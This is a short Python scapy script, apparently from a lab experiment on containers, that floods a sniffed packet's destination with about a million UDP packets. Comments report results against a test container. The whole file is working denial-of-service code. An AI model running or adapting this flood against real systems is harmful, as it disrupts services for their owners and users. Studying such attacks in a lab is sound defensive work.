from scapy.all import Raw, send, IP, UDP
def flood_destination(packet, payloadSize=1000):
    #this one should simulate a packet flood attempt. In theory, it should shut down the target container by 
    #sending a LOT of packets(or,at least, I think it should)
    print("=== Packet Snooped ===", flush=True)
    if(IP in packet and UDP in packet):
# packet = (IP(dst="127.0.0.1") / UDP(sport=4000, dport=5000) / Raw(load=b"Waffles are better than pancakes!!!"))
        # dest = packet[IP].dst
        # souPort = packet[UDP].sport
        # desPort = packet[UDP].sport
        rawMsg = b"Don't care, get ddos'ed"
        #
        for packets in range(0,1000):
            send((IP(dst=packet[IP].dst) / UDP(sport=packet[UDP].sport, dport=packet[UDP].sport) / Raw(load=rawMsg)), count = 1000)
        
#100, 200, and 1000 packets was enough to disrupt the message cycle, but not enough to shutdown the container
